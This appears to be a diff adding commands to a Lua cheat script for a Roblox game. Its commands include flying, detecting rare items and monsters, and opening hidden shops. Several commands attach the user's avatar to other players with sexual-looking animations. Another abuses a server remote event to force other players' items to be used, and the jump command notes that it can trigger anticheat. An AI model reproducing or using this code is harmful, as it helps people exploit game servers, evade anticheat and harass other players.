+	task.spawn(function() execcmd("edpn") end)
+	task.spawn(function() execcmd("erin") end)
+	task.spawn(function() execcmd("eripun") end)
+end)
+
+addcommand("disablenotifier", "dn", function()
+	task.spawn(function() execcmd("dtn") end)
+	task.spawn(function() execcmd("dlhn") end)
+	task.spawn(function() execcmd("ddpn") end)
+	task.spawn(function() execcmd("drin") end)
+	task.spawn(function() execcmd("dripun") end)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function getIndefiniteArticle(word)
+	local vowels = { A = true, E = true, I = true, O = true, U = true }
+	local firstChar = word:sub(1,1):upper()
+	return vowels[firstChar] and "an" or "a"
+end
+
+local trackingEnabled = false
+local trackedItems = {}
+local pickupWatchlist = {}
+local nameAliases = {
+	HealthKit = "Medkit",
+	SmokeBomb = "Smoke bomb",
+	EjectButton = "Eject button",
+	ChocolateBox = "Box of chocolates",
+	AirHorn = "Air horn",
+	EnigmaCandy = "Enigma candy",
+	JumperCable = "Jumper cable",
+	PopBottle = "Bottle of pop"
+}
+
+local validItemNames = {}
+for name in pairs(nameAliases) do
+	validItemNames[name] = true
+end
+
+function simplifyName(name)
+	return nameAliases[name] or name
+end
+
+function getModelPosition(model)
+	if model:IsA("BasePart") then
+		return model.Position
+	elseif model:IsA("Model") then
+		local primary = model.PrimaryPart
+		if not primary then
+			primary = model:FindFirstChildWhichIsA("BasePart")
+		end
+		return primary and primary.Position or nil
+	end
+	return nil
+end
+
+function getCharacterName(player)
+	local char = workspace:FindFirstChild("InGamePlayers"):FindFirstChild(player.Name)
+	if char and char:IsA("Model") then
+		local config = char:FindFirstChild("Config")
+		local charName = config and config:FindFirstChild("CharacterName")
+		return charName and charName.Value or "Unknown"
+	end
+	return "Unknown"
+end
+
+function monitorPickups()
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	local function isValidItem(item)
+		return item and item:IsA("Model") and item:IsDescendantOf(workspace) and validItemNames[item.Name]
+	end
+
+	while trackingEnabled do
+		local room = workspace:FindFirstChild("CurrentRoom")
+		local inGamePlayers = workspace:FindFirstChild("InGamePlayers")
+
+		if room and inGamePlayers then
+			for _, area in ipairs(room:GetChildren()) do
+				local items = area:FindFirstChild("Items")
+				if items then
+					for _, item in ipairs(items:GetChildren()) do
+						if isValidItem(item) and not pickupWatchlist[item] then
+							local pos = getModelPosition(item)
+							local closest = nil
+							local minDist = 12
+
+							if pos then
+								for _, player in ipairs(game.Players:GetPlayers()) do
+									local char = inGamePlayers:FindFirstChild(player.Name)
+									local head = char and char:FindFirstChild("Head")
+									if head then
+										local dist = (head.Position - pos).Magnitude
+										if dist < minDist then
+											minDist = dist
+											closest = player
+										end
+									end
+								end
+							end
+
+							if closest then
+								pickupWatchlist[item] = {
+									item = item,
+									name = item.Name,
+									lastPosition = pos,
+									nearestPlayer = closest
+								}
+							end
+						end
+					end
+				end
+			end
+		end
+
+		local itemsToRemove = {}
+		for item, info in pairs(pickupWatchlist) do
+			if not isValidItem(item) or not item:IsDescendantOf(workspace) then
+				local player = info.nearestPlayer
+				if player and channel then
+					local itemName = simplifyName(info.name)
+					local charName = getCharacterName(player)
+					local article = getIndefiniteArticle(itemName)
+					local msg = notify(player.Name .. " (" .. charName .. ") picked up " .. article .. " " .. itemName .. ".", 5)
+					task.spawn(function() channel:SendAsync(msg) end)
+					task.spawn(function() execcmd("dripun") end)
+					task.spawn(function() task.wait(0.1) execcmd("eripun") end)
+				end
+				table.insert(itemsToRemove, item)
+			end
+		end
+
+		for _, item in ipairs(itemsToRemove) do
+			pickupWatchlist[item] = nil
+		end
+
+		task.wait(0.2)
+	end
+end
+
+addcommand("enablerareitemspickedupnotifier", "eripun", function()
+	if trackingEnabled then return end
+	trackingEnabled = true
+	trackedItems = {}
+	pickupWatchlist = {}
+	task.spawn(monitorPickups)
+end)
+
+addcommand("disablerareitemspickedupnotifier", "dripun", function()
+	trackingEnabled = false
+	trackedItems = {}
+	pickupWatchlist = {}
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("reversemessages", "blottalk", function()
+	local Players = game:GetService("Players")
+	local TextChatService = game:GetService("TextChatService")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+	local LocalPlayer = Players.LocalPlayer
+	local CoreGui = game:GetService("CoreGui")
+
+	-- GUI presence check
+	if CoreGui:FindFirstChild("ReverseChatGui") then return end
+
+	-- Reversal utility
+	local function reverseString(str)
+		return string.reverse(str)
+	end
+
+	-- Get target recipient (for whisper)
+	local function getTargetName(targetChip)
+		if targetChip and targetChip:IsA("TextButton") then
+			local displayName = string.match(targetChip.Text or "", "^%[To%s+(.-)%]$")
+			if displayName and displayName ~= "" then
+				for _, plr in ipairs(Players:GetPlayers()) do
+					if plr.DisplayName:lower() == displayName:lower() then
+						return plr.Name
+					end
+				end
+			end
+		end
+		return "All"
+	end
+
+	-- Message sender (reversed)
+	local function sendReversedMessage(message, recipient)
+		local reversed = reverseString(message)
+		local channel = nil
+
+		if recipient and recipient ~= "All" then
+			for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do
+				if ch.Name:find("RBXWhisper:") and ch:FindFirstChild(recipient) then
+					channel = ch
+					break
+				end
+			end
+		end
+
+		if not channel then
+			channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+				or TextChatService.TextChannels:FindFirstChild("General")
+		end
+
+		if channel then
+			channel:SendAsync(reversed)
+		else
+			-- Fallback to legacy system
+			local ev = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+			if ev then
+				local say = ev:FindFirstChild("SayMessageRequest")
+				if say then
+					say:FireServer(reversed, "All")
+				end
+			end
+		end
+	end
+
+	-- Hook chat bar
+	task.spawn(function()
+		repeat task.wait() until CoreGui:FindFirstChild("ExperienceChat")
+
+		local experienceChat = CoreGui:WaitForChild("ExperienceChat")
+		local chatInputBar = experienceChat:WaitForChild("appLayout"):WaitForChild("chatInputBar")
+		local background = chatInputBar:WaitForChild("Background")
+		local container = background:WaitForChild("Container")
+		local textContainer = container:WaitForChild("TextContainer")
+		local textBoxContainer = textContainer:WaitForChild("TextBoxContainer")
+		local chatBox = textBoxContainer:WaitForChild("TextBox")
+		local targetChip = textContainer:FindFirstChild("TargetChannelChip")
+
+		if chatBox then
+			chatBox.FocusLost:Connect(function(enterPressed)
+				if enterPressed and chatBox.Text ~= "" then
+					local msg = chatBox.Text
+					local recipient = getTargetName(targetChip)
+					chatBox.Text = ""
+					task.defer(function()
+						sendReversedMessage(msg, recipient)
+					end)
+				end
+			end)
+		end
+	end)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local twistedlist = {}
+local twistedactive = false
+local twistedsent = false
+local twistedlast = tick()
+
+function formatMonsterNames(names)
+	if #names == 1 then
+		return names[1]
+	elseif #names == 2 then
+		return names[1] .. " and " .. names[2]
+	else
+		local allButLast = table.concat(names, ", ", 1, #names - 1)
+		return allButLast .. ", and " .. names[#names]
+	end
+end
+
+function cleanname(name)
+	if name == "RazzleDazzleMonster" then
+		return "Razzle & Dazzle"
+	end
+	return name:gsub("Monster", "")
+end
+
+function twistedloop()
+	local room = workspace:FindFirstChild("CurrentRoom")
+	if not room then return end
+
+	while twistedactive do
+		local newlist = {}
+		local total = 0
+		local newadded = false
+
+		if #room:GetChildren() == 0 then
+			twistedlist = {}
+			twistedsent = false
+		else
+			for _, model in ipairs(room:GetChildren()) do
+				if model:IsA("Model") then
+					local folder = model:FindFirstChild("Monsters")
+					if folder then
+						for _, monster in ipairs(folder:GetChildren()) do
+							total += 1
+							local name = cleanname(monster.Name)
+							if not twistedlist[name] then
+								table.insert(newlist, name)
+								twistedlist[name] = true
+								newadded = true
+								twistedlast = tick()
+							end
+						end
+					end
+				end
+			end
+		end
+
+		if total > 1 and #newlist > 0 and not twistedsent then
+			local formattedNames = formatMonsterNames(newlist)
+			task.wait(1)
+			notify("Twisteds: " .. formattedNames, 5)
+			task.wait(0.5)
+			twistedsent = true
+		end
+
+		if total == 0 then
+			twistedsent = false
+		end
+
+		for name in pairs(twistedlist) do
+			local exists = false
+			for _, model in ipairs(room:GetChildren()) do
+				local folder = model:FindFirstChild("Monsters")
+				if folder and folder:FindFirstChild(name .. "Monster") then
+					exists = true
+					break
+				end
+			end
+			if not exists then
+				twistedlist[name] = nil
+			end
+		end
+
+		task.wait(0.1)
+	end
+end
+
+addcommand("enabletwistedsnotifier", "etn", function()
+	if twistedactive then return end
+	twistedactive = true
+	twistedsent = false
+	twistedlist = {}
+	task.spawn(twistedloop)
+end)
+
+addcommand("disabletwistedsnotifier", "dtn", function()
+	twistedactive = false
+	twistedlist = {}
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local healthconnection
+local notifiedplayers = {}
+
+function lowhealthnotifier(name, charname)
+	notify(name .. " (" .. charname .. ") is at 1 heart.", 5)
+end
+
+addcommand("enablelowhealthnotifier", "elhn", function()
+	local players = workspace:FindFirstChild("InGamePlayers")
+	if healthconnection or not players then return end
+
+	healthconnection = noxious["run service"].RenderStepped:Connect(function()
+		for _, model in ipairs(players:GetChildren()) do
+			if model:IsA("Model") then
+				local humanoid = model:FindFirstChildOfClass("Humanoid")
+				local config = model:FindFirstChild("Config")
+				local charname = config and config:FindFirstChild("CharacterName") and config.CharacterName.Value or "Unknown"
+
+				if humanoid and humanoid.Health == 1 and not notifiedplayers[model.Name] then
+					lowhealthnotifier(model.Name, charname)
+					notifiedplayers[model.Name] = true
+				elseif humanoid and humanoid.Health > 1 then
+					notifiedplayers[model.Name] = nil
+				end
+			end
+		end
+	end)
+end)
+
+addcommand("disablelowhealthnotifier", "dlhn", function()
+	if healthconnection then
+		healthconnection:Disconnect()
+		healthconnection = nil
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local deadconnection
+local savednames = {}
+
+function deadnotifier(name, charname)
+	notify(name .. " (" .. charname .. ") died or left the game.", 5)
+end
+
+addcommand("enabledeadplayernotifier", "edpn", function()
+	local players = workspace:FindFirstChild("InGamePlayers")
+	if deadconnection or not players then return end
+
+	deadconnection = noxious["run service"].RenderStepped:Connect(function()
+		local current = {}
+
+		for _, model in ipairs(players:GetChildren()) do
+			if model:IsA("Model") then
+				local config = model:FindFirstChild("Config")
+				local charname = config and config:FindFirstChild("CharacterName") and config.CharacterName.Value or "Unknown"
+				current[model.Name] = charname
+
+				if not savednames[model.Name] then
+					savednames[model.Name] = charname
+				end
+			end
+		end
+
+		for name, charname in pairs(savednames) do
+			if not current[name] then
+				task.delay(0.5, function()
+					deadnotifier(name, charname)
+				end)
+				savednames[name] = nil
+			end
+		end
+	end)
+end)
+
+addcommand("disabledeadplayernotifier", "ddpn", function()
+	if deadconnection then
+		deadconnection:Disconnect()
+		deadconnection = nil
+		savednames = {}
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local notifieditems = {}
+local notifyitemsloopenabled = false
+
+function formatItemNames(names)
+	if #names == 1 then
+		return names[1]
+	elseif #names == 2 then
+		return names[1] .. " and " .. names[2]
+	else
+		local allButLast = table.concat(names, ", ", 1, #names - 1)
+		return allButLast .. ", and " .. names[#names]
+	end
+end
+
+function startnotifyitemsloop()
+	local room = game.Workspace:FindFirstChild("CurrentRoom")
+	if not room then return end
+
+	while notifyitemsloopenabled do
+		for _, model in ipairs(room:GetChildren()) do
+			if model:IsA("Model") then
+				local folder = model:FindFirstChild("Items")
+				if folder then
+					local found = {}
+					for _, item in ipairs(folder:GetChildren()) do
+						if table.find(rareitems, item.Name) and not notifieditems[item.Name] then
+							table.insert(found, item.Name)
+							notifieditems[item.Name] = true
+						end
+					end
+
+					if #found > 0 then
+						for i, itemname in ipairs(found) do
+							if itemnamemapping[itemname] then
+								found[i] = itemnamemapping[itemname]
+							end
+						end
+						local formattedNames = formatItemNames(found)
+						task.wait(1)
+						notify(formattedNames .. " has been detected.", 5)
+					end
+				end
+			end
+		end
+
+		for itemname, _ in pairs(notifieditems) do
+			local stillexists = false
+			for _, model in ipairs(room:GetChildren()) do
+				local folder = model:FindFirstChild("Items")
+				if folder and folder:FindFirstChild(itemname) then
+					stillexists = true
+					break
+				end
+			end
+			if not stillexists then
+				notifieditems[itemname] = nil
+			end
+		end
+
+		task.wait(0.1)
+	end
+end
+
+addcommand("enablerareitemsnotifier", "erin", function()
+	if notifyitemsloopenabled then return end
+	notifyitemsloopenabled = true
+	notifieditems = {}
+	task.spawn(startnotifyitemsloop)
+end)
+
+addcommand("disablerareitemsnotifier", "drin", function()
+	notifyitemsloopenabled = false
+	notifieditems = {}
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("opendandysshop", "ods", function()
+	game:GetService("Players")		
+	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
+	local dandyframe = mainGui:WaitForChild"DandyFrame"
+	dandyframe.Visible = true
+end)
+
+addcommand("opentoonlicenseshop", "otls", function()
+	game:GetService("Players")		
+	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
+	local storeFrame = mainGui:WaitForChild"StoreFrame"
+	storeFrame.Visible = true
+end)
+
+addcommand("opentrinketsshop", "ots", function()
+	game:GetService("Players")		
+	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
+	local trinketstoreframe = mainGui:WaitForChild"TrinketStoreFrame"
+	trinketstoreframe.Visible = true
+end)
+
+addcommand("openskinsstore", "oss", function()
+	game:GetService("Players")		
+	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
+	local skinstoreframe = mainGui:WaitForChild"SkinStoreFrame"
+	skinstoreframe.Visible = true
+end)
+
+addcommand("openskinchanger", "osc", function()
+	game:GetService("Players")		
+	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
+	local skinframe = mainGui:WaitForChild"SkinFrame"
+	skinframe.Visible = true
+end)
+
+addcommand("openmerchshop", "oms", function()
+	game:GetService("Players")		
+	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
+	local merchframe = mainGui:WaitForChild"MerchFrame"
+	merchframe.Visible = true
+end)
+
+addcommand("openoldskinunlocker", "oosu", function()
+	game:GetService("Players")		
+	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
+	local skincollectionframe = mainGui:WaitForChild"SkinCollectionFrame"
+	skincollectionframe.Visible = true
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local teleportConnections = {}
+local currentAnimationTracks = {}
+
+function playAnimation(character, animationId, connectionKey)
+	local Anim = Instance.new("Animation")		
+	Anim.AnimationId = "rbxassetid://" .. animationId
+
+	local humanoid = character:FindFirstChild("Humanoid")	
+	if humanoid then
+		currentAnimationTracks[connectionKey] = humanoid:LoadAnimation(Anim)
+		currentAnimationTracks[connectionKey]:Play()
+		currentAnimationTracks[connectionKey]:AdjustWeight(999)
+		currentAnimationTracks[connectionKey].Looped = true
+		currentAnimationTracks[connectionKey]:AdjustWeight(999)
+		task.wait()
+		currentAnimationTracks[connectionKey]:AdjustWeight(999)
+	end
+end
+
+function isAnimationPlaying(character, animationId)
+	local humanoid = character:FindFirstChild("Humanoid")
+	if humanoid then
+		for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
+			if track.Animation.AnimationId == "rbxassetid://" .. animationId then
+				return true
+			end
+		end
+	end
+	return false
+end
+
+function teleportBehindTarget(player, targetPlayer, baseOffset, connectionKey)
+	local character = player.Character
+	local targetCharacter = targetPlayer.Character
+	if character and targetCharacter then
+		local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")			
+		local playerRoot = character:FindFirstChild("HumanoidRootPart")			
+		if targetRoot and playerRoot then
+			local offset = baseOffset
+
+			if (connectionKey == "hsit" or connectionKey == "hjump") and isAnimationPlaying(targetCharacter, "16873659196") then
+				local yOffset = 3.7
+				offset = CFrame.new(baseOffset.X, yOffset, baseOffset.Z)
+			end
+
+			playerRoot.CFrame = targetRoot.CFrame * offset
+		end
+	end
+end
+
+function findPlayerByPartialName(partialName)
+	for _, player in ipairs(game.Players:GetPlayers()) do
+		if player.Name:lower():sub(1, #partialName) == partialName:lower() then
+			return player
+		end
+	end
+	return nil
+end
+
+function handleTeleportCommand(command, player, animationId, offset, connectionKey)
+	game.Workspace.Gravity = 0
+	local targetName = command:match("^" .. connectionKey .. "%s+(%S+)$")
+	local targetPlayer
+
+	if targetName then
+		if targetName:lower() == "random" then
+			local players = game.Players:GetPlayers()
+			if #players > 0 then
+				targetPlayer = players[math.random(1, #players)]
+			end
+		else
+			targetPlayer = findPlayerByPartialName(targetName)
+		end
+	end
+
+	if targetPlayer then
+		playAnimation(player.Character, animationId, connectionKey)
+
+		if teleportConnections[connectionKey] then
+			teleportConnections[connectionKey]:Disconnect()
+		end
+		teleportConnections[connectionKey] = noxious["run service"].Heartbeat:Connect(function()
+			if not targetPlayer.Character or not player.Character then
+				teleportConnections[connectionKey]:Disconnect()
+				teleportConnections[connectionKey] = nil
+				return
+			end
+			teleportBehindTarget(player, targetPlayer, offset, connectionKey)
+		end)
+	end
+end
+
+function handleStopCommand(connectionKey)
+	game.Workspace.Gravity = 196.2
+	if teleportConnections[connectionKey] then
+		teleportConnections[connectionKey]:Disconnect()
+		teleportConnections[connectionKey] = nil
+	end
+
+	if currentAnimationTracks[connectionKey] then
+		currentAnimationTracks[connectionKey]:Stop()
+		currentAnimationTracks[connectionKey] = nil
+	end
+
+	local animate = noxious["character"]:FindFirstChild("Animate")		
+	if animate then
+		animate.Disabled = true
+		for _, track in ipairs(noxious["humanoid"]:GetPlayingAnimationTracks()) do
+			track:Stop()
+		end
+		animate.Disabled = false
+	end
+end
+
+function dwbang(command, player)
+	handleTeleportCommand(command, player, "18213671382", CFrame.new(0, 0, 0.8), "bang")
+end
+
+function dwunbang()
+	handleStopCommand"bang"	
+end
+
+function dwhead(command, player)
+	handleTeleportCommand(command, player, "17098030743", CFrame.new(0, -0.35, -1.75) * CFrame.Angles(0, math.pi, 0), "head")
+end
+
+function dwunhead()
+	handleStopCommand"head"	
+end
+
+function dwhsit(command, player)
+	handleTeleportCommand(command, player, "16873659196", CFrame.new(0, 4.65, -0.3), "hsit")
+end
+
+function dwunhsit()
+	handleStopCommand"hsit"	
+end
+
+function dwhsit2(command, player)
+	handleTeleportCommand(command, player, "75597599641198", CFrame.new(0, 3.25, -0.8), "hsit2")
+end
+
+function dwunhsit2()
+	handleStopCommand"hsit2"	
+end
+
+function dwhjump(command, player)
+	handleTeleportCommand(command, player, "16909854575", CFrame.new(0, 4.65, -0.3), "hjump")
+end
+
+function dwunhjsit()
+	handleStopCommand"hjump"	
+end
+
+function bottombang(command, player)
+	handleTeleportCommand(command, player, "91029796934547", CFrame.new(0, -0.2, -0.9), "bbang")
+end
+
+function unbottombang()
+	handleStopCommand"bbang"	
+end
+
+addcommand("bang", "", function(target)
+	task.spawn(unbottombang)
+	task.spawn(dwunbang)
+	task.spawn(dwunhead)
+	task.spawn(dwunhsit)
+	task.spawn(dwunhsit2)
+	task.spawn(dwunhjsit) task.wait(0.2)
+	dwbang("bang " .. (target or ""), noxious["local player"])
+end)
+addcommand("unbang", "", dwunbang)
+
+addcommand("head", "", function(target)
+	task.spawn(unbottombang)
+	task.spawn(dwunbang)
+	task.spawn(dwunhead)
+	task.spawn(dwunhsit)
+	task.spawn(dwunhsit2)
+	task.spawn(dwunhjsit) task.wait(0.2)
+	dwhead("head " .. (target or ""), noxious["local player"])
+end)
+addcommand("unhead", "", dwunhead)
+
+addcommand("hsit", "", function(target)
+	task.spawn(unbottombang)
+	task.spawn(dwunbang)
+	task.spawn(dwunhead)
+	task.spawn(dwunhsit)
+	task.spawn(dwunhsit2)
+	task.spawn(dwunhjsit) task.wait(0.2)
+	dwhsit("hsit " .. (target or ""), noxious["local player"])
+end)
+addcommand("unhsit", "", dwunhsit)
+
+addcommand("hsit2", "", function(target)
+	task.spawn(unbottombang)
+	task.spawn(dwunbang)
+	task.spawn(dwunhead)
+	task.spawn(dwunhsit)
+	task.spawn(dwunhsit2)
+	task.spawn(dwunhjsit) task.wait(0.2)
+	dwhsit2("hsit2 " .. (target or ""), noxious["local player"])
+end)
+addcommand("unhsit2", "", dwunhsit2)
+
+addcommand("hjump", "", function(target)
+	task.spawn(unbottombang)
+	task.spawn(dwunbang)
+	task.spawn(dwunhead)
+	task.spawn(dwunhsit)
+	task.spawn(dwunhsit2)
+	task.spawn(dwunhjsit) task.wait(0.2)
+	dwhjump("hjump " .. (target or ""), noxious["local player"])
+end)
+addcommand("unhjump", "", dwunhjsit)
+
+addcommand("peg", "", function(target)
+	task.spawn(unbottombang)
+	task.spawn(dwunbang)
+	task.spawn(dwunhead)
+	task.spawn(dwunhsit)
+	task.spawn(dwunhsit2)
+	task.spawn(dwunhjsit) task.wait(0.2)
+	bottombang("bbang " .. (target or ""), noxious["local player"])
+end)
+addcommand("unpeg", "", unbottombang)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxflying = false
+noxflyspeed = 1
+noxflycontrol = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+noxflyinputbeganconnection, noxflyinputendedconnection, noxflystepconnection = nil, nil, nil
+
+addcommand("fly", "fly", function(flySpeed)
+	execcmd("unfly")
+	if noxflying then return end
+
+	game["Workspace"]["Gravity"] = 0
+	noxflying = true
+	noxflyspeed = flySpeed or 1
+
+	local ctrl
+	if noxious["is mobile?"] then
+		ctrl = require(noxious["local player"]:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
+	end
+
+	noxflyinputbeganconnection = noxious["user input service"].InputBegan:Connect(function(input, gpe)
+		if gpe then return end
+		local key = input.KeyCode
+		if key == Enum.KeyCode.W then noxflycontrol.F = 1 end
+		if key == Enum.KeyCode.S then noxflycontrol.B = -1 end
+		if key == Enum.KeyCode.A then noxflycontrol.L = -1 end
+		if key == Enum.KeyCode.D then noxflycontrol.R = 1 end
+		if key == Enum.KeyCode.E then noxflycontrol.Q = 1 end
+		if key == Enum.KeyCode.Q then noxflycontrol.E = -1 end
+	end)
+
+	noxflyinputendedconnection = noxious["user input service"].InputEnded:Connect(function(input)
+		local key = input.KeyCode
+		if key == Enum.KeyCode.W then noxflycontrol.F = 0 end
+		if key == Enum.KeyCode.S then noxflycontrol.B = 0 end
+		if key == Enum.KeyCode.A then noxflycontrol.L = 0 end
+		if key == Enum.KeyCode.D then noxflycontrol.R = 0 end
+		if key == Enum.KeyCode.E then noxflycontrol.Q = 0 end
+		if key == Enum.KeyCode.Q then noxflycontrol.E = 0 end
+	end)
+
+	noxflystepconnection = noxious["run service"].RenderStepped:Connect(function()
+		local camCF = workspace.CurrentCamera.CFrame
+		local direction
+
+		if noxious["is mobile?"] and ctrl then
+			direction = ctrl:GetMoveVector()
+			local moveVec = (
+				-camCF.LookVector * direction.Z +
+					camCF.RightVector * direction.X +
+					Vector3.new(0, noxflycontrol.Q + noxflycontrol.E, 0)
+			) * noxflyspeed * 50
+
+			noxious["humanoid root part"].CFrame = CFrame.new(noxious["humanoid root part"].Position, noxious["humanoid root part"].Position + Vector3.new(camCF.LookVector.X, 0, camCF.LookVector.Z))
+			noxious["humanoid root part"].Velocity = moveVec.Magnitude > 0 and moveVec or Vector3.zero
+
+		else
+			local flatLookVector = Vector3.new(camCF.LookVector.X, 0, camCF.LookVector.Z).Unit
+			local moveVec = (
+				camCF.LookVector * (noxflycontrol.F + noxflycontrol.B) +
+					camCF.RightVector * (noxflycontrol.R + noxflycontrol.L) +
+					Vector3.new(0, noxflycontrol.Q + noxflycontrol.E, 0)
+			) * noxflyspeed * 50
+
+			if flatLookVector.Magnitude > 0 then
+				noxious["humanoid root part"].CFrame = CFrame.new(noxious["humanoid root part"].Position, noxious["humanoid root part"].Position + flatLookVector)
+			end
+
+			noxious["humanoid root part"].Velocity = moveVec.Magnitude > 0 and moveVec or Vector3.zero
+		end
+	end)
+end)
+
+addcommand("unfly", "unfly", function()
+	if not noxflying then return end
+
+	noxflying = false
+	game["Workspace"]["Gravity"] = 196.2
+
+	noxious["humanoid root part"].Velocity = Vector3.zero
+
+	if noxflyinputbeganconnection then noxflyinputbeganconnection:Disconnect() end
+	if noxflyinputendedconnection then noxflyinputendedconnection:Disconnect() end
+	if noxflystepconnection then noxflystepconnection:Disconnect() end
+
+	noxflycontrol = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("spin", "spin", function(speed)
+	local character = noxious["character"]
+	if character then
+		for _, v in pairs(character:WaitForChild"HumanoidRootPart":GetChildren()) do
+			if v.Name == "Spinning" then
+				v:Destroy()
+			end
+		end
+
+		local spin = Instance.new("BodyAngularVelocity")			
+		spin.Name = "Spinning"
+		spin.Parent = character:WaitForChild"HumanoidRootPart"			
+		spin.MaxTorque = Vector3.new(0, math.huge, 0)
+		spin.AngularVelocity = Vector3.new(0, speed, 0)
+	end
+end)
+
+addcommand("unspin", "unspin", function()
+	local character = noxious["character"]
+	if character then
+		for _, v in pairs(character:WaitForChild"HumanoidRootPart":GetChildren()) do
+			if v.Name == "Spinning" then
+				v:Destroy()
+			end
+		end
+	end
+
+	local b = noxious["character"]:WaitForChild("Body", 5)
+	if not b or not b:IsA("BasePart") then
+		return
+	end
+
+	for _, child in ipairs(b:GetChildren()) do
+		if child:IsA("AlignOrientation") or child:IsA("Attachment") then
+			child:Destroy()
+			execcmd("unview")
+		end
+	end
+
+	b.Anchored = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("enablejumping", "ejump", function()
+	task.spawn(function()
+		local touchGui = noxious["local player"]:WaitForChild("PlayerGui"):WaitForChild("TouchGui")	
+		local touchControlFrame = touchGui:FindFirstChild("TouchControlFrame")		
+		local jumpButton = touchControlFrame and touchControlFrame:FindFirstChild("JumpButton")
+
+		local touchGui = noxious["local player"]:WaitForChild("PlayerGui"):WaitForChild("TouchGui")
+		touchGui:WaitForChild"TouchControlFrame"
+
+		local mainGui = noxious["local player"]:WaitForChild("PlayerGui"):WaitForChild("MainGui")			
+		local menu = mainGui:WaitForChild"Menu"			
+		local inviteButton = menu:WaitForChild"InviteButton"			
+		local infoButton = menu:WaitForChild"InfoButton"			
+		local settingsButton = menu:WaitForChild"SettingsButton"
+
+		jumpButton.Visible = true
+		inviteButton.Visible = false
+		infoButton.Visible = false
+		settingsButton.Visible = false
+	end)
+
+	task.spawn(function()
+		noxious["humanoid"].JumpPower = 50.145
+		noxious["humanoid"].JumpHeight = 7.2
+
+		noxious["local player"].CharacterAdded:Connect(function(newCharacter)
+			local newHumanoid = newCharacter:WaitForChild"Humanoid"			
+			newHumanoid.JumpPower = 50.145
+			newHumanoid.JumpHeight = 7.2
+		end)
+	end)
+
+	notify("Spam jumping can trigger anticheat.", 5, "warning")
+end)
+
+addcommand("disablejumping", "djump", function()
+	task.spawn(function()
+		local touchGui = noxious["local player"]:WaitForChild("PlayerGui"):WaitForChild("TouchGui")	
+		local touchControlFrame = touchGui:FindFirstChild("TouchControlFrame")		
+		local jumpButton = touchControlFrame and touchControlFrame:FindFirstChild("JumpButton")
+
+		local touchGui = noxious["local player"]:WaitForChild("PlayerGui"):WaitForChild("TouchGui")
+		touchGui:WaitForChild"TouchControlFrame"
+		local mainGui = noxious["local player"]:WaitForChild("PlayerGui"):WaitForChild("MainGui")			
+		local menu = mainGui:WaitForChild"Menu"			
+		local inviteButton = menu:WaitForChild"InviteButton"			
+		local infoButton = menu:WaitForChild"InfoButton"			
+		local settingsButton = menu:WaitForChild"SettingsButton"
+
+		jumpButton.Visible = false
+		inviteButton.Visible = true
+		infoButton.Visible = true
+		settingsButton.Visible = true
+	end)
+
+	task.spawn(function()
+		if not noxious["in studio"] then noxious["humanoid"].JumpHeight = 0 end
+
+		noxious["local player"].CharacterAdded:Connect(function(newCharacter)
+			local newHumanoid = newCharacter:WaitForChild"Humanoid"
+			if not noxious["in studio"] then newHumanoid.JumpHeight = 0 end
+		end)
+	end)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("forceuseitems", "fui", function(target)
+	local players = noxious["players"]
+	local replicatedStorage = game:GetService("ReplicatedStorage")
+	local itemEvent = replicatedStorage:FindFirstChild("Events") and replicatedStorage.Events:FindFirstChild("ItemEvent")
+
+	if not itemEvent then
+		return
+	end
+
+	local function invokeItem(targetPlayer, slot)
+		if not targetPlayer or not targetPlayer.Character then
+			return
+		end
+
+		local character = targetPlayer.Character
+		local inventory = character:FindFirstChild("Inventory")
+		local item = inventory and inventory:FindFirstChild(slot)
+
+		if item then
+			local args = {
+				[1] = character,
+				[2] = item
+			}
+			itemEvent:InvokeServer(unpack(args))
+		end
+	end
+
+	local playersList = {}
+	if target == "me" then
+		table.insert(playersList, players.LocalPlayer)
+	elseif target == "others" then
+		for _, player in ipairs(players:GetPlayers()) do
+			if player ~= players.LocalPlayer then
+				table.insert(playersList, player)
+			end
+		end
+	elseif target == "all" then
+		playersList = players:GetPlayers()
+	elseif target == "random" then
+		local allPlayers = players:GetPlayers()
+		if #allPlayers > 0 then
+			local randomPlayer = allPlayers[math.random(1, #allPlayers)]
+			table.insert(playersList, randomPlayer)
+		end
+	else
+		for _, player in ipairs(players:GetPlayers()) do
+			if player.Name:lower():find(target:lower(), 1, true) then
+				table.insert(playersList, player)
+				break
+			end
+		end
+	end
+
+	if #playersList == 0 then
+		return
+	end
+
+	for _, targetPlayer in ipairs(playersList) do
+		for _, slot in ipairs({ "Slot1", "Slot2", "Slot3" }) do
+			invokeItem(targetPlayer, slot)
+		end
+	end
+end)
+
+local loopForceUseItemsTasks = {}
+
